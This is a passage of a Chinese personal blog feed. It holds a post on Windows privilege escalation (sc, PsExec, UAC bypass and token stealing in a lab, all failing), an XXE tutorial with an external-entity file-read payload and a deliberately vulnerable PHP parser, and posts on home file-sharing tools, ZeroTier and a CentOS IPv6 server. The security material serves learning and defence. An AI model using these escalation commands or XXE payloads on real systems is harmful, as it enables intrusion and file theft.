class="language-bash">其中systemcmd是服务名称，大家可以随意填写，binpath是启动的命令，<span class="built_in">type</span>=own是指服务这个服务属于谁，<span class="built_in">type</span>=interact。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里再解释一下 cmd/k start 这个命令，这个命令就是启动一个新的cmd窗口。</span></span><br><span class="line"></span><br><span class="line">sc start systemcmd #启动服务！</span><br></pre></td></tr></table></figure><p>然而依旧没有sc的使用权限<br><img src="1da3fa294d7c4883b1cfa606d14eb060.png" alt=""></p><h1 id="PS提权">PS提权</h1><p><code>PsExec</code>是 Sysinternals 工具包中的一款命令行实用程序，可以在远程计算机上执行进程，并且可以在一定程度上提升权限。它的提权原理主要是通过以下步骤实现：</p><blockquote><p>1、使用<code>管理员凭据</code>登录到目标计算机。<br>2、将 PsExec 所在的计算机上的可执行文件和其他必需的文件复制到目标计算机上，并确保这些文件可以被管理员访问。<br>3、执行 PsExec 命令，并将要运行的程序或脚本等作为参数传递给 PsExec。此时，PsExec 会先以管理员权限在目标计算机上启动一个服务（<code>PsExecSvc</code>），并向该服务发送要执行的命令。<br>4、在 PsExecSvc 的帮助下，PsExec 实际上是利用<code>Windows 远程过程调用（RPC）</code>机制来在目标计算机上创建了一个新的进程，并以管理员权限运行该进程。这个新进程就相当于是已经进行了提权操作的进程。</p></blockquote><p>提权命令：<code>psexec.exe -accepteula -s -i -d cmd.exe</code><br>我们这里登录的账户并不是管理员，所以寄了<br><img src="e41d4c46fa6245148dea3cea271cdbad.png" alt=""></p><h1 id="BypassUAC">BypassUAC</h1><p><code>UAC（用户账户控制）</code>是从 Windows Vista 开始引入的一种安全功能，可以限制应用程序和用户对计算机系统的更改，并将管理员权限的请求提示给用户以确认。其工作原理如下：</p><blockquote><p>1、当需要执行某个需要管理员权限的操作时，应用程序或用户会向 UAC 发送请求。<br>2、UAC 首先会检查当前用户的访问权限，并根据需要弹出一个用户界面，提示用户输入管理员凭据（用户名和密码）。<br>3、如果用户输入正确的管理员凭据，UAC 就会创建一个新的安全令牌（Token），其中包含了管理员权限。这个新的令牌称为 Elevated Token。<br>4、应用程序或用户在接下来的操作中就可以使用 Elevated Token 所具有的管理员权限来执行高级任务，例如修改系统设置、安装软件等。<br>需要注意的是，当使用 Elevated Token 时，应用程序或用户仍然受到 UAC 的监控和限制。如果要执行敏感操作，建议在操作后立即取消 Elevated Token 权限，以降低系统风险。</p></blockquote><p>在msf中集成了bypassuac模块，但我们提权的时候，当前用户必须在<code>管理员组</code>中，且UAC必须为默认设置（即“<code>仅在程序试图更改我的计算机时通知我</code>”）<br><img src="985d2a3964114cf0983a711a09f33498.png" alt=""><br>果然还是失败了</p><h1 id="令牌窃取">令牌窃取</h1><p><code>令牌窃取（Token Stealing）</code>是一种攻击技术，可以使用操作系统中的特权漏洞或恶意软件等手段来获取其他进程或用户的<code>安全令牌（Security Token）</code>，从而获得对系统资源和权限的访问控制。</p><p>Kerberos 是 Windows 系统中一个常用的身份验证协议，可以帮助用户在不安全的网络环境中建立安全信任关系，并防止密码被破解或监听等威胁。然而，如果系统中存在 Kerberos 相关的漏洞或错误，攻击者可以利用这些漏洞或错误来进行令牌窃取攻击。</p><p>在 Windows 操作系统中，每个登录用户都会拥有一个唯一的安全令牌，该令牌包含了用户的身份信息、权限等，并且可以被用于身份验证、授权、进程通信等场景下的安全标识和传递。与此同时，在 Kerberos 认证过程中，当用户向 Kerberos 服务器发送凭据请求（TGT 请求）后，Kerberos 服务器将返回一个包含用户身份信息和授权信息的 Kerberos 票据。该票据也可以被视为一种安全令牌，并且能够帮助用户在其他服务或应用程序中进行身份验证和访问控制。</p><p>我们在拿到win7的shell以后可以通过<code>use incognito</code>和<code>list_tokens -u</code>来列出可用的令牌<br><img src="75e4950571944ccd8ab2246406ae3f71.png" alt=""><br>明显这里只有demo/douser的令牌，所以令牌窃取无效</p><h1 id="最后">最后</h1><p>暂时能想到的提权方法就这么多了，实际上也可以使用Powershell的提权脚本<code>Powerup</code>，但这里win7默认是禁止使用Powershell脚本的，并且当前账户也没有权限对其进行修改，所以GG了<br><img src="6f0e512152a54f92b8baa3e0c96f47a4.png" alt=""></p><p>大佬们有什么方法欢迎评论告知</p><p>参考：<br><a href="https://blog.csdn.net/weixin_40412037/article/details/121535553">https://blog.csdn.net/weixin_40412037/article/details/121535553</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序&quot;&gt;序&lt;/h1&gt;
&lt;p&gt;本来兴致勃勃的想要学一下内网横向渗透的，结果发现其他人随随便便用永恒之蓝就直接拿到了system权限，但同样的靶机，自己电脑上的永恒之蓝完全没用，于是干脆复习了一遍window下的权限提升方法。&lt;br&gt;
（本文主要是针对windows提权</summary>
      
    
    
    
    <category term="学习记录" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="后渗透" scheme="http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞详解</title>
    <link href="http://example.com/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>http://example.com/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</id>
    <published>2023-02-22T07:57:28.000Z</published>
    <updated>2023-03-20T15:15:14.480Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介">简介</h1><p>XXE(XML External Entity Injection) <code>XML外部实体注入</code>,之前听这个词听过很多次了,但由于平日里不管是ctf比赛或者是src遇到的都不多,所以一直没有详细的了解过,趁着假期空闲,决定好好学一下这方面的知识。</p><p>XML一般可以用来做数据传输和数据存储,其传输功能和JSON类似,但现在基本使用JSON,很少使用XML,因为XML使用起来太“重”了,而外部实体引入是XML的一个正常功能,但如果在引入时,注入了恶意的外部实体,但本地对注入的外部实体未做严格校验,这时就会出现XXE漏洞。</p><h1 id="XML基础">XML基础</h1><p>要明白XXE,我们可以首先从XML基础学起。</p><p>一个XML文档结构包括、<code>XML声明、文档类型定义DTD（可选）、文档元素</code>。</p><p>例如下面这一段就是标准的XML文档</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">user</span> (<span class="keyword">username</span>, <span class="keyword">password</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">username</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">password</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="4d4d27c0633b434f8243f7d8b50a5ce2.png" alt=""></p><p>通过DTD可以验证XML是否符合正确的语法规则 （DTD实际上类似一段说明文字,说明XML文档的组成元素及结构,如果这里将DTD中的username改为name,打开XML文档并不会报错,只是不符合DTD中定义的语法规则）,DTD可以本地声明,也可以外部引用,而XXE主要就是从DTD入手。</p><h1 id="DTD实体">DTD实体</h1><p>实体是<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>,可在内部或外部进行声明。</p><p>实体包括<code>一般实体</code>和<code>参数实体</code>,为防止大家被绕晕,这里我们只讲一般实体。</p><p>一般实体声明方式：<code>&lt;!ENTITY 名字 '内容'&gt;</code></p><p>使用方式：<code>&amp;名字;</code></p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在浏览器中打开</p><p><img src="470a490266c14d9d8af3bc61cca3c847.png" alt=""></p><p>而外部实体声明方式为： <code>&lt;!ENTITY 名字 SYSTEM &quot;URI/URL&quot;&gt;</code></p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;admin.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>admin.txt中的内容如下<br><img src="2f42b5236de848d99d31ff0d72379852.png" alt=""></p><p>在IE8浏览器(其他浏览器显示不出来)中打开</p><p><img src="3043d1c444e2426fbcede512168256e4.png" alt=""></p><p>同时在引用外部实体时,可以使用不同的协议类型来引用 ：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///path/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=file.txt</span><br></pre></td></tr></table></figure><p>聪明的你们一定已经发现了,只要将admin.txt换成其他文件,就可以实现文件的任意读取了</p><h1 id="PHP中的XML">PHP中的XML</h1><p>php中常见的与XML有关的函数是 <code>simplexml_load_string</code></p><p>其用法为 <code>simplexml_load_file(string,class,options,ns,is_prefix)</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要使用的 XML 字符串。</td></tr><tr><td>class</td><td>可选。规定新对象的 class。</td></tr><tr><td>options</td><td>可选。规定附加的 Libxml 参数。</td></tr><tr><td>ns</td><td>可选。</td></tr><tr><td>is_prefix</td><td>可选。</td></tr></tbody></table><p>一个简单的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//通过php伪协议直接接收POST传参</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="string">&quot;SimpleXMLElement&quot;</span>, LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;username;</span><br></pre></td></tr></table></figure><p>利用XXE读取log.txt的内容<br><img src="4d7a3d360f154acc92b406c30ac7e9e3.png" alt=""></p><h1 id="防御">防御</h1><p>XXE的防御一般通过两种方式<br>1.使用开发语言提供的禁用外部实体的方法, 例如php中使用<code>libxml_disable_entity_loader(true)</code><br>2.对用户输入的内容进行过滤,过滤掉<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>,或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;简介&lt;/h1&gt;
&lt;p&gt;XXE(XML External Entity Injection) &lt;code&gt;XML外部实体注入&lt;/code&gt;,之前听这个词听过很多次了,但由于平日里不管是ctf比赛或者是src遇到的都不多,所以一直没有详细的了解过,趁着假期空闲</summary>
      
    
    
    
    <category term="知识分享" scheme="http://example.com/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="xxe" scheme="http://example.com/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>seafile和alist使用体验</title>
    <link href="http://example.com/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/"/>
    <id>http://example.com/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</id>
    <published>2023-02-11T06:18:09.000Z</published>
    <updated>2023-02-20T04:36:08.386Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景">背景</h3><p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p><p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h3 id="seafile">seafile</h3><p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p><p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p><p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p><p>优点：</p><p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p><p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p><p>​    3.访问时必须要输入密码，提高了数据的安全性</p><p>缺点：</p><p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p><p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p><p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p><p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h3 id="alist">alist</h3><p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p><p>alist的部署更加简单，具体可以看这位博主的文章</p><p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p><p>同样讲一下alist的优缺点</p><p>优点：</p><p>​    1.搭建简单、配置也不麻烦、页面简易美观</p><p>​    2.支持大体积文件的在线预览、不用下载也能观看</p><p>缺点：</p><p>​    1.没有客户端工具只能通过网页端访问资源</p><p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p><p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p><p>​    4.有点“重”，内容多的话要加载很久</p><p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p><h3 id="alist的安全问题">alist的安全问题</h3><p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p><p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p><p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p><p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p><p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p><p>同时也可以参考下面这位up主的视频</p><p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p><h3 id="最后">最后</h3><p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;背景&quot;&gt;背景&lt;/h3&gt;
&lt;p&gt;家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的&lt;strong&gt;私人网盘&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;im</summary>
      
    
    
    
    <category term="使用体验" scheme="http://example.com/categories/%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/"/>
    
    
    <category term="alist" scheme="http://example.com/tags/alist/"/>
    
    <category term="seafile" scheme="http://example.com/tags/seafile/"/>
    
  </entry>
  
  <entry>
    <title>Zerotier的使用体验</title>
    <link href="http://example.com/post/zerotier/"/>
    <id>http://example.com/post/zerotier/</id>
    <published>2023-02-11T04:57:18.000Z</published>
    <updated>2023-03-22T13:01:46.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景">背景</h1><p>我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）</p><p>一开始怀疑是我的ddns脚本出了问题，因为阿里云的解析日志一直没有更新，就想通过<strong>爆破</strong>的方式获得真实的ipv6地址，也失败了（不得不说ipv6空间范围是真的大，开10个线程爆了我2小时，呜呜呜~~~）</p><p><img src="https://image.3001.net/images/20220208/16443286461724.png" alt="img"></p><p>周末回到家（论工作地点离家近的重要性hhh）才发现是ipv6地址被<strong>回收</strong>了，只给我留了个<strong>fe80</strong>开头的内网ipv6地址</p><p><img src="ed356665c6d9454b8696d70828f6d416.jpeg" alt="img"></p><p>重启路由器的ipv6开关以后又重新得到了ipv6地址（这里不知道是路由器配置的问题还是什么原因，有懂的师傅欢迎在评论区补充）</p><p>为了防止这种情况再次发生，除了ipv6直接访问以外我还得有一种备用措施，在没有ipv6的情况下也能访问内网设备，于是Zerotier成为了我的目标</p><h1 id="Zerotier">Zerotier</h1><p>Zerotier是一款用于构建<strong>异地虚拟局域网</strong>的工具，通过网页后台创建虚拟网络并通过电脑上的Zerotier客户端连接各个异地电脑到虚拟局域网，从而实现组网由后台分配虚拟ip，并且各个异地电脑可以通过虚拟IP对同一虚拟局域网下的其他电脑进行访问</p><p><img src="43d97752d6ff40539818eefbcb6289e2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="安装配置">安装配置</h2><p>Zerotier的安装配置都比较简单，可参照b站上这位up主的视频</p><p><a href="https://www.bilibili.com/video/BV1hK4y1L7ND/?buvid=XU7B1187220CEA5BEB8E1D6547D1ECD2814F4&amp;is_story_h5=false&amp;mid=CZP6291YuQ9EvlArsK6mQw%3D%3D&amp;p=1&amp;plat_id=114&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=bb883d71-ff0f-45c4-ac3a-cdd56ff7cf9b&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1676083314&amp;unique_k=arTrXpi&amp;up_id=35973342&amp;vd_source=b2a0cc29ab6a8cf18c26c53dcd232ca4">强大的内网穿透工具ZeroTier，随时随地远程访问家中NAS和其它设备！没有公网IP也不怕_哔哩哔哩_bilibili</a></p><p>同时centos 的安装可以参照这位大佬的文章</p><p><a href="https://blog.csdn.net/COCO56/article/details/123296985#">https://blog.csdn.net/COCO56/article/details/123296985#</a></p><h2 id="体验">体验</h2><p>Zerotier和传统的内网穿透工具不同，并不是通过一个中转服务器来建立连接的，而是使用端到端的<strong>p2p</strong>协议（在连接不稳定的时候也会采用中转服务器的方式建立连接）</p><p><img src="d14f7e6dbc424d29a8a9137b177fb8a2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>可以看到延迟并不算很高，这几天用下来个人还是比较满意的</p><p>通过这种方式可以部署一些<strong>只有内网ipv4才可以访问</strong>的服务，例如我就用niginx开了个ipv4的端口，将数据转发到了路由器上，下次ipv6出现问题也就可以直接通过Zerotier访问路由器重启ipv6服务</p><h2 id="安全性">安全性</h2><p>Zerotier作为一款强大的网络存取服务，拥有内置的AES-256加密算法，并提供安全控制，可以控制用户连接的访问，以限制对私有网络的访问，并防止未经授权的访问，所以Zerotier的安全性还是比较高的</p><h1 id="结语">结语</h1><p>总的来说，ZeroTier的使用确实非常容易。它的简单易用性，功能丰富的网络功能和强大的安全特性，使ZeroTier成为最佳的专业网络解决方案，特别是在新兴兼容性和技术能力需求时期。</p><p>（此段结语由ChatGPT生成，嘻嘻~~，总的来说Zerotier还是比较简单好用的，有内网访问需求的伙伴们可以考虑使用）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;背景&lt;/h1&gt;
&lt;p&gt;我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）&lt;/p&gt;
&lt;p&gt;一开始怀疑是我的</summary>
      
    
    
    
    <category term="使用体验" scheme="http://example.com/categories/%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/"/>
    
    
    <category term="zerotier" scheme="http://example.com/tags/zerotier/"/>
    
  </entry>
  
  <entry>
    <title>利用ipv6搭建一台服务器</title>
    <link href="http://example.com/post/%E5%88%A9%E7%94%A8ipv6%E6%90%AD%E5%BB%BA%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://example.com/post/%E5%88%A9%E7%94%A8ipv6%E6%90%AD%E5%BB%BA%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2023-02-07T11:58:15.000Z</published>
    <updated>2023-03-22T13:03:45.197Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景">背景</h3><p>继上次发现ipv6以来由于要实习，一直只是在尝试部分小功能的实现，终于在这个春节假期才有了一大段空闲时间来部署服务器</p><h3 id="硬件需求">硬件需求</h3><p>首先要搭建属于自己的服务器得要有一定的硬件条件，服务器其实就是一台一天24小时开启的计算机，家里有一台10年前的电脑，处理器是4核的赛扬j1900，其实已经是满足我的基本需求了的，但一是电脑已经装了windows系统并储存了一些资料不能随意重装linux系统，所以我决定买一台迷你主机。</p><p>在某鱼上花280买了一台<strong>迷你主机</strong>，处理器是奔腾n3540,4+256的，同时准备一个储存<strong>大于或等于8G</strong>的u盘</p><p><img src="761de0f3c70c43659a554c024a231ea0.jpeg" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h3 id="准备工作">准备工作</h3><p>我准备使用<strong>centos7</strong>作为服务器的操作系统，所以要下载centos7的镜像</p><p><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">centos-7-isos-x86_64安装包下载_开源镜像站-阿里云 (aliyun.com)</a></p><p><img src="55ec81e2cb7f4039b6d0396ba8f6dbd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>下载balenaetcher将iso文件烧录至U盘中</p><p><a href="https://www.balena.io/etcher#download-etcher">balenaEtcher - Flash OS images to SD cards &amp; USB drives</a></p><p>可以以这个up主的视频作为参考</p><p><a href="https://b23.tv/LeqXDBR">（上）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a><br><a href="https://b23.tv/dgXG2DN">（下）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a></p><h3 id="安装系统">安装系统</h3><p>安装系统的步骤参考上面两个视频，但可能会遇得到安装失败情况（俺就遇到了）</p><p><img src="e14067cf3de543a9b7e8d2ff3c9e7300.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>原因是因为计算机插入U盘以后加上计算机本身自带的储存空间一共有两块硬盘，而我们在安装的时候没有指定安装文件（.iso）在哪个硬盘里面，所以安装失败，只需选中正确的安装硬盘就可以了，解决方法可以参照下面两个大佬的方法：</p><p><a href="https://blog.csdn.net/zwhfyy/article/details/78991446">Centos7安装时引导错误以及解决方案_zwhfyy的博客-CSDN博客_centos 安装报错</a></p><p><a href="https://blog.csdn.net/weixin_34205826/article/details/93020109">Centos安装错误的解决方法_weixin_34205826的博客-CSDN博客</a></p><h3 id="配置网络">配置网络</h3><p>系统安装完成以后就要开始配置网络了，我采取的方法是在局域网内使用固定的ipv4地址，同时开启centos的ipv6地址</p><p>首先使用ifconfig查看网卡名字和分配的ip地址，如果已经有ipv6和ipv4地址了就不用管了，如果没有就需要对网卡配置文件进行修改</p><p>使用以下命令对网卡配置进行修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-网卡名字 <span class="comment">#打开网卡配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#没有ipv6则加上这么几句话</span></span><br><span class="line">IPV6INIT=<span class="built_in">yes</span></span><br><span class="line">IPV6_AUTOCONF=<span class="built_in">yes</span></span><br><span class="line">IPV6_DEFROUTE=<span class="built_in">yes</span></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启网卡</span></span><br><span class="line">systemctl restart network</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" 